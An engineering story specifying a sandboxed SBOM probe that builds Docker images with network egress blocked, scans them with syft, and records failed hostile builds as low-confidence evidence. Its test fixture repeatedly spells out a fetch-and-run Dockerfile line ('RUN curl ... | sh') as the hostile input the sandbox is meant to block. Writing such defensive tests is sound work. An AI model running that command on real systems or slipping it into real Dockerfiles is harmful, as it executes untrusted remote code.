# Story S6-01 — `SyftSBOMProbe` + sandboxed `docker build` + base-image-pull scoped egress

**Step:** Step 6 — Ship Layer C dynamic probes: `SyftSBOMProbe`, `GrypeCVEProbe`
**Status:** Ready
**Effort:** L
**Depends on:** S1-06 (`tools.docker` + `tools.syft` wrappers + `network="scoped"` in `run_in_sandbox`; six-binary `ALLOWED_BINARIES`; `tools/digests.yaml` pin), S5-01 (`DockerfileProbe` — provides the `requires=["dockerfile"]` peer output and the Dockerfile/`.dockerignore` content-hash inputs the cache key consumes)
**ADRs honored:** ADR-0003 (extend `run_in_sandbox`; `network="scoped"` allowlisted to one registry host for the base-image pull, `--network=none` for build steps; no local registry mirror), ADR-0004 (cache key includes `syft_digest` from `tools/digests.yaml`), ADR-0005 (`docker` + `syft` are ADR-gated additions to `ALLOWED_BINARIES`; the `docker build` host-daemon-coupling open question is owned here)

## Context

`SyftSBOMProbe` (C2) is one of the two Phase-2 probes that **execute foreign code at scale** — `docker build` invokes the user's Dockerfile inside the subprocess sandbox, then `syft` scans the resulting image. The roadmap names this probe explicitly in the Phase-2 tooling list; Phase 3's deterministic vuln-remediation recipe path reads `sbom.packages[].version` to pick patch targets. The load-bearing pieces are (a) the **sandbox + scoped-egress interaction** — `--network=none` during build steps, `network="scoped"` allowlisted to *exactly one* registry host for the initial base-image pull, and (b) the **cache key composition** including `base_image_digest_at_registry` so a registry-side image bump invalidates exactly this probe's slice.

The cache key is `(dockerfile_hash, dockerignore_hash, lockfile_hash, base_image_digest_at_registry, syft_digest, probe_version, schema_version)`. Base-image digest resolves via a single `docker manifest inspect` call (~200 ms) that the wrapper LRU-caches for 1 hour per `base_image_ref` (`final-design.md §"Components" §4.2`). On cache miss the probe runs `docker build --quiet -t codegenie/<repo_hash>:<gather_id> .` inside the sandbox, then `syft <image-digest> -o json` against the produced image; on cache hit it skips both build and scan and reuses the cached SBOM JSON.

Hostile-Dockerfile handling is **honest evidence, not exception handling.** A `RUN curl http://1.1.1.1 | sh` line fails inside the sandbox because the build phase runs with `--network=none`; the probe records `build_status: failed, network_egress_attempted: true, confidence: low` and emits a structured warning. The slice still validates; the Planner reads the supply-chain risk as a fact. The dedicated adversarial pin lives in S6-03; this story ships a probe-level hostile-Dockerfile test so the defense is enforced at probe-PR-merge time.

The macOS fallback (Open Question #1 → "Implementation-level risks" #9) is a real branch: `docker build` opens a Unix socket to the host daemon by default, and on macOS the `sandbox-exec` profile cannot constrain that the same way Linux `bwrap` constrains the build-phase network. If `docker buildx --driver=docker-container` doesn't make the sandbox honest, the probe falls back to `confidence: low` with a structured `sandbox.docker_build_daemon_coupling` warning. Linux CI is the supported path; the macOS branch must be explicit, not silent.

## References — where to look

- **Architecture:**
  - `../phase-arch-design.md §"Component design" #8 SyftSBOMProbe` — full interface, cache key, hostile-Dockerfile handling, failure behavior.
  - `../phase-arch-design.md §"Data model"` — `SBOMSlice` + `SBOMPackage` Pydantic shapes (lines ~1290–1306): `image_digest`, `base_image`, `packages: list[SBOMPackage]`, `build_status: Literal["ok", "failed"]`, `network_egress_attempted: bool`, `syft_version`; per package: `name`, `version`, `type: Literal["npm", "deb", "apk", "rpm", "binary"]`, `purl`, `licenses`.
  - `../phase-arch-design.md §"Edge cases"` row 9 (`RUN curl ... | sh`).
  - `../phase-arch-design.md §"Process view"` — `SBOM` lane in the sequence diagram; `tools.docker.build → image digest → tools.syft.run → SBOM JSON`.
  - `../phase-arch-design.md §"Component design" #2 tools/`: `docker.py` returns image digest; `syft.py` consumes it (`tools.syft.run`).
- **Phase ADRs:**
  - `../ADRs/0003-subprocess-sandbox-profile-extension.md` — `network="scoped"` semantics; per-tool allowlist; macOS best-effort caveat; **no local registry mirror**.
  - `../ADRs/0004-tools-digests-yaml-pin-manifest.md` — `syft_digest` is the cache-key contribution; install-gate verification.
  - `../ADRs/0005-allowed-binaries-additions.md §"docker"` + §"syft"` — threat surface, invocation pattern, the open question on host-daemon coupling.
- **Production ADRs:**
  - `../../../production/adrs/0005-no-llm-in-gather-pipeline.md` — facts, not judgments. `build_status: failed` is evidence, not a probe bug.
- **Source design:**
  - `../final-design.md §"Components" §4.2 SyftSBOMProbe` — synthesis row D9; refuses [S]'s local registry mirror, refuses [B]'s deferral; keeps [P]'s build-config-hash cache key.
  - `../final-design.md §"Failure modes & recovery"` rows for `docker build network=none` and `syft` exit non-zero.
- **Existing code:**
  - `src/codegenie/tools/docker.py` (S1-06) — `tools.docker.build(opts) → DockerBuildResult` (image digest); `tools.docker.manifest_inspect(ref) → BaseImageDigest`; LRU-cached 1h per `base_image_ref`.
  - `src/codegenie/tools/syft.py` (S1-06) — `tools.syft.run(image_digest, raw_output_path) → SyftResult`.
  - `src/codegenie/exec.py` (S1-06) — `run_in_sandbox(..., network="scoped", scoped_egress_hosts=[...])`.
  - `src/codegenie/probes/dockerfile.py` (S5-01) — peer probe whose output this probe consumes via `requires=["dockerfile"]`.
  - `src/codegenie/probes/base.py` (Phase 0) — `Probe` ABC.
  - `src/codegenie/catalogs/tools/digests.yaml` (S1-08) — `syft_digest` + `docker_digest` cache-key sources.
  - `src/codegenie/errors.py` (S1-01) — `ToolNonZeroExit`, `ToolTimeout`, `ToolOutputMalformed`, `ToolInvariantViolation`.

## Goal

Ship a deterministic `SyftSBOMProbe` that, on cache miss, performs `docker build` inside the subprocess sandbox (`--network=none` during build, `network="scoped"` allowlisted to the configured base-image registry host for the initial pull only), invokes `syft` against the produced image digest, parses the syft JSON into a strict `SBOMSlice`, and records `build_status` + `network_egress_attempted` + `confidence` honestly — including the hostile-Dockerfile path that fails the build and produces low-confidence honest evidence.

## Acceptance criteria

- [ ] `src/codegenie/probes/syft_sbom.py` exists; `SyftSBOMProbe(Probe)` declares `name = "syft_sbom"`, `layer = "C"`, `tier = "image"`, `applies_to_languages = ["*"]`, `applies_to_tasks = ["*"]`, `requires = ["dockerfile"]`, `declared_inputs = ["Dockerfile", "Dockerfile.*", ".dockerignore", "package.json", "pnpm-lock.yaml", "yarn.lock", "package-lock.json"]`, `timeout_seconds = 300`, and `version: str`.
- [ ] `src/codegenie/schema/probes/syft_sbom.schema.json` exists, Draft 2020-12, `additionalProperties: false` at the slice root and at every nested block (`SBOMPackage`, `BaseImageRef`); validates the `phase-arch-design.md §"Data model"` `SBOMSlice` shape exactly (no extra fields, no missing required fields, `build_status` enum is `["ok", "failed"]`, `package.type` enum is `["npm", "deb", "apk", "rpm", "binary"]`, `network_egress_attempted: bool` required when `build_status: "failed"`).
- [ ] Cache key implements `(dockerfile_blake3, dockerignore_blake3, lockfile_blake3, base_image_digest_at_registry, syft_digest, probe_version, schema_version)` — verified by `tests/unit/probes/test_syft_sbom.py::test_cache_key_invalidates_on_base_image_digest_change` which calls the probe twice with the **same** Dockerfile but a **different** monkeypatched `tools.docker.manifest_inspect` return and asserts two distinct cache keys.
- [ ] On cache miss, the probe calls `tools.docker.build(..., network="scoped", scoped_egress_hosts=[<configured registry host>])` for the **initial pull only**, and the build phase runs with `network="none"` per ADR-0003 — verified by `tests/unit/probes/test_syft_sbom.py::test_sandbox_network_posture` that records the `run_in_sandbox` calls (monkeypatched) and asserts the network/allowlist pair on each invocation.
- [ ] On cache miss, after a successful build, the probe calls `tools.syft.run(image_digest, raw_output_path=<.codegenie/context/raw/sbom.<gather_id>.json>)` exactly once and parses its output into `SBOMSlice` — raw JSON written to `raw/` **before** parsing per ADR-0004's "raw-then-parse" wrapper invariant.
- [ ] Hostile-Dockerfile unit test pinned at probe level (probe-PR-merge gate; S6-03 is the system-level pin): `tests/unit/probes/test_syft_sbom.py::test_hostile_run_curl_pipe_sh_records_low_confidence_honestly` builds a fixture with `Dockerfile` containing `FROM alpine\nRUN curl http://1.1.1.1 | sh`; monkeypatches `tools.docker.build` to raise `ToolNonZeroExit` (the way the sandbox would surface a network-blocked build); asserts (i) `build_status == "failed"`, (ii) `network_egress_attempted is True`, (iii) `confidence == "low"`, (iv) `warnings` contains `"sandbox.docker_build_network_blocked"`, (v) **no `packages` array is emitted** (`packages == []`), (vi) the slice still validates against `syft_sbom.schema.json`.
- [ ] Happy-path SBOM extraction test: `tests/unit/probes/test_syft_sbom.py::test_happy_path_sbom_from_recorded_fixture` uses a recorded `syft` JSON fixture under `tests/fixtures/tool_outputs/syft/alpine_node18.json` (or equivalent); asserts `image_digest`, `base_image`, ≥ 1 `SBOMPackage` with valid `purl`, `build_status == "ok"`, `network_egress_attempted is False`, `confidence == "high"`.
- [ ] Cache-hit test: `tests/unit/probes/test_syft_sbom.py::test_cache_hit_skips_build_and_scan` — second run with unchanged Dockerfile + base-image-digest + lockfile + `syft_digest` produces zero `tools.docker.build` calls and zero `tools.syft.run` calls (monkeypatched spies); slice byte-identical to first run.
- [ ] macOS fallback branch is explicit: `tests/unit/probes/test_syft_sbom.py::test_macos_daemon_coupling_fallback_low_confidence` simulates `tools.docker.build` raising `ToolInvariantViolation("docker_build_daemon_coupling")`; asserts `confidence == "low"`, `warnings == ["sandbox.docker_build_daemon_coupling"]`, `build_status == "failed"`; gather still completes exit-0 (the `--strict` flag is the CI hammer per ADR-0003 consequences).
- [ ] `applies()` returns `False` when no `Dockerfile` is present in the snapshot; `tests/unit/probes/test_syft_sbom.py::test_applies_false_without_dockerfile` confirms.
- [ ] `network="scoped"` allowlist contains exactly one host (the configured base-image registry host from config; default `docker.io`); never two; never wildcard — pinned by `tests/unit/probes/test_syft_sbom.py::test_scoped_egress_allowlist_is_single_host`.
- [ ] `src/codegenie/probes/__init__.py` registers `SyftSBOMProbe` via one additive import (no edits to existing registrations).
- [ ] Definition-of-done: `ruff check`, `ruff format --check`, `mypy --strict` on `syft_sbom.py` pass; `pytest tests/unit/probes/test_syft_sbom.py -q` passes; per-module coverage reported in PR body (the carve-out floor for `syft_sbom.py` is 85/75 per High-level-impl §"Step 8" and `pyproject.toml` per-module floor; the carve-out is the floor, not the target).

## Implementation outline

1. **Schema first.** Author `syft_sbom.schema.json` mirroring `SBOMSlice` from `phase-arch-design.md §"Data model"`. `additionalProperties: false` at root and every nested block. `image_digest: string (sha256:* pattern)`; `base_image: {ref: string, digest: string}`; `packages: array of SBOMPackage`; `build_status: enum ["ok", "failed"]`; `network_egress_attempted: bool`; `syft_version: string`. Schema-level **conditional**: `if build_status == "failed" then required: [network_egress_attempted] and packages: maxItems 0`.
2. **Probe shell** — declare class attributes per Acceptance §1; `applies(snapshot)` returns `bool(snapshot.has_file("Dockerfile") or snapshot.has_glob("Dockerfile.*"))`.
3. **Cache-key composition** — implement `_compute_cache_key(snapshot, ctx, peer_outputs=None)` returning a BLAKE3 digest of the tuple:
   - `dockerfile_hash`: content-BLAKE3 of `Dockerfile` (from snapshot)
   - `dockerignore_hash`: content-BLAKE3 of `.dockerignore` if present, else `b"\0"*32`
   - `lockfile_hash`: content-BLAKE3 of the first lockfile found among `declared_inputs` lockfile globs (consistent with `BuildGraphProbe` ordering)
   - `base_image_digest_at_registry`: `await tools.docker.manifest_inspect(base_image_ref)` (LRU-cached 1h in the wrapper)
   - `syft_digest`: from `codegenie.catalogs.tools.digests["syft"]` (loaded once at module import)
   - `probe_version`, `schema_version`: module constants
4. **Cache lookup** — query the Phase-0 content-addressed cache by composed key. On hit, deserialize the cached `SBOMSlice` JSON and return `ProbeOutput(confidence="high", schema_slice=..., warnings=[])`.
5. **Cache miss path — build:**
   - Resolve `base_image_ref` from the peer `dockerfile` slice's `base_image` field (the `DockerfileProbe` already parses `FROM ...` for us).
   - Read the configured base-image registry host from `ctx.config["sbom"]["base_image_registry"]` (default `"docker.io"`).
   - Call `tools.docker.build(repo_root, network="scoped", scoped_egress_hosts=[<host>], tag=f"codegenie/{ctx.repo_hash}:{ctx.gather_id}", quiet=True)`. The wrapper internally uses `network="scoped"` only for the initial pull and `network="none"` for build steps (per ADR-0003; the wrapper is the right abstraction — the probe does not redundantly route per-step).
   - If `tools.docker.build` raises `ToolNonZeroExit` (build failed inside `--network=none`): collect `network_egress_attempted: bool` from the wrapper's structured failure record; build `SBOMSlice(build_status="failed", network_egress_attempted=<bool>, packages=[], image_digest="", base_image=<ref>, syft_version=<digest_short>)`; return `ProbeOutput(confidence="low", warnings=["sandbox.docker_build_network_blocked"])`.
   - If `tools.docker.build` raises `ToolInvariantViolation("docker_build_daemon_coupling")` (macOS fallback): build the same `build_status="failed"` slice; return `ProbeOutput(confidence="low", warnings=["sandbox.docker_build_daemon_coupling"])`. **This is the ADR-0005 explicit macOS branch** — surface the warning loudly; do not catch silently.
6. **Cache miss path — scan:** On `tools.docker.build` success → `image_digest` returned. Call `tools.syft.run(image_digest, raw_output_path=ctx.raw_dir / f"sbom.{ctx.gather_id}.json")`. The wrapper writes raw JSON to disk first, then parses. Map the syft result into `SBOMSlice`: `image_digest`, `base_image`, `packages: [SBOMPackage(name, version, type, purl, licenses) for p in syft.packages]`, `build_status: "ok"`, `network_egress_attempted: False`, `syft_version`.
7. **Cache write** — serialize the slice JSON and write into the content-addressed cache at the composed key.
8. **`OutputSanitizer` integration** — Passes 1–5 run over the slice via the coordinator (no probe-side hooks). The slice has no secret-shaped fields and no markdown body; nothing for Pass 4/5 to fingerprint here.
9. **Register** in `src/codegenie/probes/__init__.py` via one additive import.

## TDD plan — red / green / refactor

### Red

Path: `tests/unit/probes/test_syft_sbom.py`

```python
"""Pins:
- SyftSBOMProbe records honest evidence (build_status / network_egress_attempted), not exceptions.
- Cache key composition includes base_image_digest_at_registry + syft_digest (ADR-0004).
- Sandbox posture: --network=none for build, network="scoped" allowlisted to ONE host for the pull (ADR-0003).
- Hostile RUN curl|sh case yields confidence="low" + warnings, slice still validates.
- macOS daemon-coupling fallback is explicit, not silent.
Traces to: phase-arch-design.md §Component design #8 + §Data model + §Edge cases row 9; ADR-0003; ADR-0004; ADR-0005."""
import json
import pytest
from pathlib import Path

@pytest.mark.asyncio
async def test_happy_path_sbom_from_recorded_fixture(tmp_path, monkeypatch, _recorded_syft):
    ...  # asserts SBOMSlice fields populated; build_status="ok"; confidence="high"

@pytest.mark.asyncio
async def test_hostile_run_curl_pipe_sh_records_low_confidence_honestly(tmp_path, monkeypatch):
    ...  # ToolNonZeroExit → build_status="failed", network_egress_attempted=True,
         # confidence="low", warnings has "sandbox.docker_build_network_blocked",
         # packages == [], slice still passes syft_sbom.schema.json

@pytest.mark.asyncio
async def test_cache_key_invalidates_on_base_image_digest_change(tmp_path, monkeypatch):
    ...  # same Dockerfile, two different manifest_inspect returns → two distinct keys

@pytest.mark.asyncio
async def test_cache_hit_skips_build_and_scan(tmp_path, monkeypatch):
    ...  # second run: 0 docker.build calls, 0 syft.run calls, byte-identical slice

@pytest.mark.asyncio
async def test_sandbox_network_posture(tmp_path, monkeypatch):
    ...  # records run_in_sandbox calls; build phase network="none";
         # base-image pull network="scoped" with allowlist == [<configured host>]

@pytest.mark.asyncio
async def test_scoped_egress_allowlist_is_single_host(tmp_path, monkeypatch):
    ...  # allowlist length == 1; never wildcard

@pytest.mark.asyncio
async def test_macos_daemon_coupling_fallback_low_confidence(tmp_path, monkeypatch):
    ...  # ToolInvariantViolation("docker_build_daemon_coupling") →
         # confidence="low", warnings=["sandbox.docker_build_daemon_coupling"]

@pytest.mark.asyncio
async def test_applies_false_without_dockerfile(tmp_path):
    ...  # repo with no Dockerfile → applies() returns False
```

Run `pytest tests/unit/probes/test_syft_sbom.py -q`. All fail — the probe doesn't exist.

### Green

Implement per the **Implementation outline**: schema → probe shell → cache key → cache lookup → cache-miss build branch (hostile path included) → cache-miss scan branch → cache write → register. Iterate until green.

### Refactor

- Extract `_compute_cache_key(snapshot, ctx, dockerfile_slice)` into a top-level helper; cite ADR-0004's cache-key-composition list in its docstring.
- Extract `_failure_slice(build_status, network_egress_attempted, base_image_ref, syft_digest) → SBOMSlice` for the two failure branches (network-blocked + daemon-coupling) — same construction, different warnings.
- Confirm the only `run_in_sandbox`-touching code lives behind `tools.docker.*` and `tools.syft.*` wrappers; grep `syft_sbom.py` for `subprocess`, `run_in_sandbox`, `bwrap`, `sandbox-exec` — all must be empty.
- `mypy --strict` clean; `ruff format` + `ruff check`.

## Files to touch

| Path | Why |
|---|---|
| `src/codegenie/probes/syft_sbom.py` | New — `SyftSBOMProbe` implementation. |
| `src/codegenie/schema/probes/syft_sbom.schema.json` | New — strict slice schema; `additionalProperties: false`; `if build_status == "failed"` conditional. |
| `src/codegenie/probes/__init__.py` | Edit — one additive import. |
| `src/codegenie/schema/repo_context.schema.json` | Edit — `$ref` compose under `probes.syft_sbom` (optional). |
| `tests/unit/probes/test_syft_sbom.py` | New — eight unit tests pinning the contract. |
| `tests/fixtures/tool_outputs/syft/` | New if absent — at least one recorded syft JSON fixture (`alpine_node18.json`) sized to exercise package extraction; tool-digest-pinned per ADR-0004. |
| `tests/fixtures/hostile_dockerfile_curl/` | Touched if not yet present — the probe-level hostile-Dockerfile fixture (`Dockerfile` with `RUN curl http://1.1.1.1 | sh`). S6-03 owns the system-level adversarial test against the same fixture; share the fixture directory. |

## Out of scope

- **`docker run` of the produced image** — that's `RuntimeTraceProbe` (C4), deferred to Phase 5 (S5-05 ships C4 class + sub-schema only with `applies()=False`).
- **Trivy cross-check** — handled by `GrypeCVEProbe`'s `--paranoid` flag (S6-02), not here.
- **Local registry mirror / supply-chain pre-pull** — refused by ADR-0003; deferred to Phase 14.
- **CVE matching against the SBOM** — that's `GrypeCVEProbe` (S6-02), which consumes this probe's slice via `requires=["syft_sbom"]`.
- **`docker buildx --driver=docker-container` driver selection logic** — the choice lives inside `tools.docker.build` (S1-06), not in this probe. If integration shows the default driver doesn't constrain the sandbox, file a follow-up against `tools.docker.py`; do not push driver-selection into the probe.
- **The dedicated system-level adversarial fixture + test** — `tests/adv/test_hostile_dockerfile_curl.py` and `tests/adv/test_syft_zipbomb.py` are S6-03's deliverable. This story's unit test is the probe-PR gate; S6-03 is the end-to-end CLI gate.
- **Coverage gate enforcement** — the per-module 85/75 floor is wired by Step 8 (S8-06); this story reports the number in the PR body.

## Notes for the implementer

- **The hostile-Dockerfile path is not an error path; it is a value path.** A failed build inside `--network=none` is *the expected outcome* for hostile Dockerfiles, and the slice you emit (`build_status: failed`, `network_egress_attempted: true`, `packages: []`) is the **product of the probe**, not the absence of it. Do not wrap the failure in a `try/except` that swallows the warning; surface it as evidence. Phase 3's recipe planner reads `network_egress_attempted: true` as a supply-chain red flag.
- **`network="scoped"` allowlist must contain exactly one host.** Resist any urge to add `"localhost"`, `"127.0.0.1"`, or a wildcard for "convenience" — the ADR-0003 consequence is that `tests/adv/test_no_unscoped_network_egress.py` (Phase 2 root adversarial test) asserts no second host appears. The configured registry host is *the* allowlist. If the base-image is `docker.io/library/node:18`, the host is `registry-1.docker.io`; the resolution happens once in `tools.docker.manifest_inspect`, not in the probe.
- **Base-image-digest LRU cache lives in the wrapper, not the probe.** `tools.docker.manifest_inspect` is the LRU-cached call (1h TTL per `base_image_ref`). Calling it twice in the same gather is fine — the second call is in-process cache-hit. Do **not** add a per-probe LRU.
- **Cache key includes `syft_digest`, not `docker_digest`.** The `syft` binary is the SBOM producer whose output bytes the cache key must invalidate against. `docker_digest` (the docker binary digest) is not in the cache key — the **base-image-digest-at-registry** is what `docker build` consumes, and that field already covers any registry-side image bump. This matches ADR-0004's cache-key spec verbatim.
- **`network_egress_attempted: True` is a fact, not a guess.** The wrapper's `ToolNonZeroExit` carries a structured `failure_signal` field populated by parsing build stderr/exit-code; the probe reads it. Do not infer the bool from a regex on stderr in probe code — that lives in the wrapper. The probe consumes the structured signal.
- **The macOS daemon-coupling fallback must be loud.** If `docker buildx --driver=docker-container` doesn't constrain the build's host-daemon socket, `tools.docker.build` raises `ToolInvariantViolation("docker_build_daemon_coupling")` and the probe records `confidence: low` + `warnings: ["sandbox.docker_build_daemon_coupling"]`. The startup banner already announces macOS sandbox best-effort caveats per ADR-0003; the per-probe warning is the second layer. Do **not** silently degrade to `confidence: medium` — that hides the threat model from the Planner.
- **Performance:** the cold path is ~30 s p50 (docker build + syft scan) per the perf envelope (`phase-arch-design.md §"Component design" #8`). The base-image manifest-inspect call (~200 ms) is amortized by the wrapper's LRU; do not block on it in cache-hit path. Cache-hit path must be < 50 ms (slice deserialization only).
- **Raw artifacts under `raw/`.** Syft JSON goes to `.codegenie/context/raw/sbom.<gather_id>.json` with `0644` permissions (no secrets in SBOM output, so no `0600`). The probe writes via `tools.syft.run`'s `raw_output_path` argument — never via direct `open()`. ADR-0004's "raw-then-parse" invariant is wrapper-enforced.
- **`requires=["dockerfile"]` is the normal `requires` mechanism (not `consumes_peer_outputs`).** The peer-output frozen-snapshot path (ADR-0001) is reserved for `IndexHealthProbe`. `SyftSBOMProbe` reads the `dockerfile` slice through the standard coordinator-injected `ctx.peer_results["dockerfile"]` accessor — Phase 2 normal-`requires` path. Do not import the frozen-snapshot machinery here.
